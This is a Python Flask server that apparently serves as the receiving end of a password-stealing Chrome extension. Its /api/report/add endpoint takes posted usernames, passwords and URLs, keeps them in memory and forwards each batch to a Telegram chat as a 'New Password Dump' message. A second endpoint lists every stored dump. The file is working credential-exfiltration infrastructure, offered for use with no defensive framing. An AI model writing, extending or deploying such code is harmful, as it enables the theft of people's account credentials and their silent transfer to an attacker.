import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app) # Allows Chrome Extension to talk to Render

# Configuration from Render Env Vars
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# In-memory storage for simple demo (Use SQLite/Postgres for production)
STORAGE_DB = []

def send_to_telegram(data):
    """Formats data and sends it to your Telegram Chat"""
    if not BOT_TOKEN or not CHAT_ID:
        print("Missing Telegram Config")
        return False

    # Format the message nicely
    msg = "<b>🔐 New Password Dump</b>\n"
    msg += f"<i>Time:</i> {data.get('timestamp', 'Unknown')}\n"
    msg += "<hr>"
    
    items = data.get('items', [])
    if not items:
        msg += "<i>No passwords found.</i>"
    else:
        for item in items:
            user = item.get('username', 'N/A')
            pw = item.get('password', 'N/A')
            url = item.get('url', 'No URL')
            
            # Truncate long URLs for readability
            display_url = url[:50] + ("..." if len(url) > 50 else "")
            
            msg += f"• <b>{display_url}</b>\n"
            msg += f"  👤 User: <code>{user}</code>\n"
            msg += f"  🔑 Pass: <code>{pw}</code>\n\n"

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        
        if response.status_code == 200:
            print("Sent to Telegram successfully!")
            return True
        else:
            print(f"Telegram Error: {response.text}")
            return False
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

@app.route('/api/report/add', methods=['POST'])
def add_report():
    try:
        data = request.json
        
        # Add timestamp for record keeping
        import datetime
        data['timestamp'] = datetime.datetime.now().isoformat()
        
        # Save to local DB (List)
        STORAGE_DB.append(data)
        
        # Send to Telegram immediately
        telegram_success = send_to_telegram(data)
        
        return jsonify({
            "status": "success", 
            "telegram_sent": telegram_success,
            "record_count": len(data.get('items', []))
        }), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/reports', methods=['GET'])
def get_reports():
    """Optional: View all dumps on a web page/dashboard"""
    return jsonify(STORAGE_DB)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
